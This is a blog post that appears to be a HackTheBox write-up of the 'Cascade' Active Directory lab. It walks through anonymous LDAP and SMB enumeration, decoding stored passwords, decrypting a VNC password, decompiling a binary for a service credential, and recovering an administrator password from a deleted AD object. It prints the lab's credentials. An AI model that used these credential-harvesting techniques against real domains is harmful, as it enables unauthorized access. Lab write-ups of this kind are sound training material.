---
layout: post
title:  Cascade
categories: hackthebox
tags: [hackthebox, windows, medium, enum4linux, Active Directory, decompile, dnspy, VbScrub]
lang: "en"
image:
    path: assets/images/hackthebox/cascade/preview.png
    width: 300
    height: 300
---

![cascade](../../../../assets/images/hackthebox/cascade/cascade.jpg)

# abstract

Cascade is a medium box from [@VbScrub](https://twitter.com/vbscrub). The box provides a Windows server with Active Directory. To crack it
some enumeration is required. After you are on the machine, you get the credentials for the next level by decompiling an
application. To become a root user, the password must be extracted from a deleted Active Directory object.

# enumeration

As always I start a nmap scan first.

## nmap

```bash
# Nmap 7.80 scan initiated Mon Mar 30 11:33:44 2020 as: nmap -sC -sT -sV -o init.nmap cascade.htb
Nmap scan report for cascade.htb (10.10.10.182)
Host is up (0.032s latency).
Not shown: 987 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-30 15:35:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-30T15:35:53
|_  start_date: 2020-03-30T07:10:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 30 11:37:23 2020 -- 1 IP address (1 host up) scanned in 219.33 seconds
```

## enum4linux

Since it is a Windows machine, enum4linux never does any harm.

```bash
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 30 16:49:47 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... cascade.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on cascade.htb    |
 =================================================== 
[E] Can't find workgroup/domain


 =========================================== 
|    Nbtstat Information for cascade.htb    |
 =========================================== 
Looking up status of 10.10.10.182
No reply from 10.10.10.182

 ==================================== 
|    Session Check on cascade.htb    |
 ==================================== 
[+] Server cascade.htb allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 ========================================== 
|    Getting domain SID for cascade.htb    |
 ========================================== 
Unable to initialize messaging context
Domain Name: CASCADE
Domain Sid: S-1-5-21-3332504370-1206983947-1165150453
[+] Host is part of a domain (not a workgroup)

 ===================================== 
|    OS information on cascade.htb    |
 ===================================== 
[+] Got OS info for cascade.htb from smbclient: 
[+] Got OS info for cascade.htb from srvinfo:
Unable to initialize messaging context
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================ 
|    Users on cascade.htb    |
 ============================ 
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull	Name: Adrian Turnbull	Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc	Name: ArkSvc	Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson	Name: Ben Hanson	Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc	Name: BackupSvc	Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman	Name: David Burman	Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe	Name: Edward Crowe	Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft	Name: Ian Croft	Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen	Name: Joseph Allen	Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand	Name: John Goodhand	Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield	Name: James Wakefield	Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson	Name: Ryan Thompson	Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson	Name: Stephanie Hickson	Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith	Name: Steve Smith	Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util	Name: Util	Desc: (null)

user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

 ======================================== 
|    Share Enumeration on cascade.htb    |
 ======================================== 
Unable to initialize messaging context

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on cascade.htb

 =================================================== 
|    Password Policy Information for cascade.htb    |
 =================================================== 


[+] Attaching to cascade.htb using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:CASCADE.HTB)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] CASCADE
	[+] Builtin

[+] Password Info for Domain: CASCADE

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================= 
|    Groups on cascade.htb    |
 ============================= 

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]

[+] Getting builtin group memberships:
Group 'Guests' (RID: 546) has member: CASCADE\CascGuest
Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests
Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group 'Users' (RID: 545) has member: CASCADE\Domain Users
Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[IT] rid:[0x459]
group:[Production] rid:[0x45a]
group:[HR] rid:[0x45b]
group:[AD Recycle Bin] rid:[0x45f]
group:[Backup] rid:[0x460]
group:[Temps] rid:[0x463]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
group:[Factory] rid:[0x46c]
group:[Finance] rid:[0x46d]
group:[Audit Share] rid:[0x471]
group:[Data Share] rid:[0x472]

[+] Getting local group memberships:
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith
Group 'IT' (RID: 1113) has member: CASCADE\arksvc
Group 'IT' (RID: 1113) has member: CASCADE\s.smith
Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers
Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc
Group 'HR' (RID: 1115) has member: CASCADE\s.hickson
Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith
Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]

[+] Getting domain group memberships:
Group 'Domain Guests' (RID: 514) has member: CASCADE\CascGuest
Group 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\administrator
Group 'Domain Users' (RID: 513) has member: CASCADE\administrator
Group 'Domain Users' (RID: 513) has member: CASCADE\krbtgt
Group 'Domain Users' (RID: 513) has member: CASCADE\arksvc
Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith
Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson
Group 'Domain Users' (RID: 513) has member: CASCADE\util
Group 'Domain Users' (RID: 513) has member: CASCADE\j.wakefield
Group 'Domain Users' (RID: 513) has member: CASCADE\s.hickson
Group 'Domain Users' (RID: 513) has member: CASCADE\j.goodhand
Group 'Domain Users' (RID: 513) has member: CASCADE\a.turnbull
Group 'Domain Users' (RID: 513) has member: CASCADE\e.crowe
Group 'Domain Users' (RID: 513) has member: CASCADE\b.hanson
Group 'Domain Users' (RID: 513) has member: CASCADE\d.burman
Group 'Domain Users' (RID: 513) has member: CASCADE\BackupSvc
Group 'Domain Users' (RID: 513) has member: CASCADE\j.allen
Group 'Domain Users' (RID: 513) has member: CASCADE\i.croft

 ====================================================================== 
|    Users on cascade.htb via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[I] Found new SID: S-1-5-21-3332504370-1206983947-1165150453
[I] Found new SID: S-1-5-21-2189247330-517467924-712900258
[+] Enumerating users using SID S-1-5-21-3332504370-1206983947-1165150453 and logon username '', password ''
S-1-5-21-3332504370-1206983947-1165150453-500 CASCADE\administrator (Local User)
S-1-5-21-3332504370-1206983947-1165150453-501 CASCADE\CascGuest (Local User)
S-1-5-21-3332504370-1206983947-1165150453-502 CASCADE\krbtgt (Local User)
...
S-1-5-21-3332504370-1206983947-1165150453-512 CASCADE\Domain Admins (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-513 CASCADE\Domain Users (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-514 CASCADE\Domain Guests (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-515 CASCADE\Domain Computers (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-516 CASCADE\Domain Controllers (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-517 CASCADE\Cert Publishers (Local Group)
S-1-5-21-3332504370-1206983947-1165150453-518 CASCADE\Schema Admins (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-519 CASCADE\Enterprise Admins (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-520 CASCADE\Group Policy Creator Owners (Domain Group)
S-1-5-21-3332504370-1206983947-1165150453-521 CASCADE\Read-only Domain Controllers (Domain Group)
...
S-1-5-21-3332504370-1206983947-1165150453-1001 CASCADE\CASC-DC1$ (Local User)
...
[+] Enumerating users using SID S-1-5-21-2189247330-517467924-712900258 and logon username '', password ''
S-1-5-21-2189247330-517467924-712900258-500 CASC-DC1\Administrator (Local User)
S-1-5-21-2189247330-517467924-712900258-501 CASC-DC1\Guest (Local User)
...
S-1-5-21-2189247330-517467924-712900258-513 CASC-DC1\None (Domain Group)
...

 ============================================ 
|    Getting printer info for cascade.htb    |
 ============================================ 
Unable to initialize messaging context
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Mar 30 16:53:30 2020
```

Here you can already see that there are some users, maybe a ldap search will give you even more results.

## ldapsearch

I query the LDAP server for all its objects. The output was shortened and reduced to the essential.

```bash
kali@kali:~/hacking_stuff/htb/machines/cascade$ ldapsearch -LLL -x -H ldap://cascade.htb -b 'dc=cascade,dc=local'

...
dn:CN=RyanThompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass:top
objectClass:person
objectClass:organizationalPerson
objectClass:user
cn:RyanThompson
sn:Thompson
givenName:Ryan
distinguishedName:CN=RyanThompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType:4
whenCreated:20200109193126.0Z
whenChanged:20200323112031.0Z
displayName:RyanThompson
uSNCreated:24610
memberOf:CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged:295010
name:RyanThompson
objectGUID::LfpD6qngUkupEy9bFXBBjA==
userAccountControl:66048
badPwdCount:3
codePage:0
countryCode:0
badPasswordTime:132400958635935702
lastLogoff:0
lastLogon:132247339125713230
pwdLastSet:132230718862636251
primaryGroupID:513
objectSid::AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires:9223372036854775807
logonCount:2
sAMAccountName:r.thompson
sAMAccountType:805306368
userPrincipalName:r.thompson@cascade.local
objectCategory:CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData:20200126183918.0Z
dSCorePropagationData:20200119174753.0Z
dSCorePropagationData:20200119174719.0Z
dSCorePropagationData:20200119174508.0Z
dSCorePropagationData:16010101000000.0Z
lastLogonTimestamp:132294360317419816
msDS-SupportedEncryptionTypes:0
cascadeLegacyPwd:clk0bjVldmE=
...
```

There is one attribute which contains a legacy password, this is Base64 encoded. 

```bash
kali@kali:~/hacking_stuff/htb/machines/cascade$ echo clk0bjVldmE= | base64 -d
rY4n5eva
```

So the first credentials are safe: r.thompson : rY4n5eva

# smb as r.thompson

Being anonymous I didn't get much out of the SMB server, so now I try it as r.thompson.

```bash
kali@kali:~/hacking_stuff/htb/machines/cascade$ smbclient -W CASCADE -U r.thompson -L //cascade.htb/
Enter CASCADE\r.thompson's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

With a recursive search and the following download I download all files that are readable for me.

```bash
kali@kali:~/hacking_stuff/htb/machines/cascade/smb$ smbclient -W CASCADE -U r.thompson //cascade.htb/Data
Enter CASCADE\r.thompson's password: 
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (20.2 KiloBytes/sec) (average 20.2 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (10.6 KiloBytes/sec) (average 15.4 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (48.2 KiloBytes/sec) (average 26.3 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (21.6 KiloBytes/sec) (average 25.2 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
```

An e-mail informing that the user TempAdmin has the current administrator password. This is a very interesting information for later.

```html
<html>
<body lang=EN-GB link=blue vlink=purple style='tab-interval:36.0pt'>

<div class=WordSection1>

<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
style='mso-bidi-font-family:Calibri;color:black'>From:<span style='mso-tab-count:
1'> </span></span></b><span
style='mso-bidi-font-family:Calibri;color:black'>Steve Smith
<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
style='mso-bidi-font-family:Calibri;color:black'>To:<span style='mso-tab-count:
1'> </span></span></b><span
style='mso-bidi-font-family:Calibri;color:black'>IT (Internal)<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
style='mso-bidi-font-family:Calibri;color:black'>Sent:<span style='mso-tab-count:
1'> </span></span></b><span
style='mso-bidi-font-family:Calibri;color:black'>14 June 2018 14:07<o:p></o:p></span></p>


<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
style='mso-bidi-font-family:Calibri;color:black'>Subject:<span
style='mso-tab-count:1'> </span></span></b><span
style='mso-bidi-font-family:Calibri;color:black'>Meeting Notes<o:p></o:p></span></p>

<p><o:p>&nbsp;</o:p></p>

<p>For anyone that missed yesterdays meeting (Im looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the Best GPO competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>


</div>

</body>

</html>
```

The logfile in the s.smith directory provides a hexadecimal encoded password. However, this was encrypted.

```log
kali@kali:~/hacking_stuff/htb/machines/cascade/smb/IT/Temp/s.smith$ cat VNC\ Install.reg 
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

```log
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

# exploitation

After a little Google research I came across the following [Article](https://snovvcrash.rocks/cheatsheets/#vnc). It explains how to decrypt the password with a metasploit module.

![msf irb](../../../../assets/images/hackthebox/cascade/0_msf.png)

Now I try the password.

![userflag](../../../../assets/images/hackthebox/cascade/1_userflag.png)

That was it, the user was taken over.

# privilege escalation

Next, I'm trying to become an administrator. Since I have found nothing interesting at first sight but s.smith I try to go back again.

## Way to arksvc

S.Smith has access to the Audit Share. I download this recursively.

```bash
kali@kali:~/hacking_stuff/htb/machines/cascade/smb_as_s.smith$ smbclient -W Cascade -U s.smith //cascade.htb/Audit$
Enter CASCADE\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                       A    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                13106687 blocks of size 4096. 7793999 blocks available
smb: \> recurse on
smb: \> mask ""
smb: \> prompt off
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (87.2 KiloBytes/sec) (average 87.2 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (98.4 KiloBytes/sec) (average 92.3 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as Audit.db (193.5 KiloBytes/sec) (average 124.1 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.4 KiloBytes/sec) (average 96.4 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (1706.7 KiloBytes/sec) (average 563.5 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (280.8 KiloBytes/sec) (average 429.1 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (2638.4 KiloBytes/sec) (average 1108.4 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as SQLite.Interop.dll (2139.7 KiloBytes/sec) (average 1339.2 KiloBytes/sec)
```

There is a SQLite3 database, in the table ldap I find a Base64 encoded password. Should it really be that simple?

```bash
kali@kali:~/hacking_stuff/htb/machines/cascade/smb_as_s.smith$ sqlite3 DB/Audit.db 
SQLite version 3.32.3 2020-06-18 14:00:33
Enter ".help" for usage hints.
sqlite> show tables
   ...> ;
Error: near "show": syntax error
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
sqlite> SELECT * from Misc;
sqlite> select * from ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Of course not. The password was encrypted. Since the audit program accesses the database, the password must be stored somewhere in the application.

## dnspy

I start my Windows VM and try to decompile the .exe file and actually I find a password and an IV sum to decrypt the value.
I make it a bit easy and let the application run in debug mode and at the end I just grab the password.

![dnspy](../../../../assets/images/hackthebox/cascade/2_dnspy.png)

![arksvc](../../../../assets/images/hackthebox/cascade/3_arksvc.png)

## Way to root

The TempAdmin user was deleted, but there was the information that he uses the same password as the real Adminsitrator account, because the user has arksvc rights in
recycle bin around, I'm trying to recover the password somehow.

![deletedObjects](../../../../assets/images/hackthebox/cascade/4_DeletedObjects.png)

The displayed deleted items all have an ID, if you try to get the properties especially after this ID you get the following output:

![TempAdmin](../../../../assets/images/hackthebox/cascade/5_TempAdmin.png)

There's the password. But again Base64 encoded.

## root

The password has been decoded and tested. It works and the login as administrator is successful.

![Administrator](../../../../assets/images/hackthebox/cascade/6_Admin.png)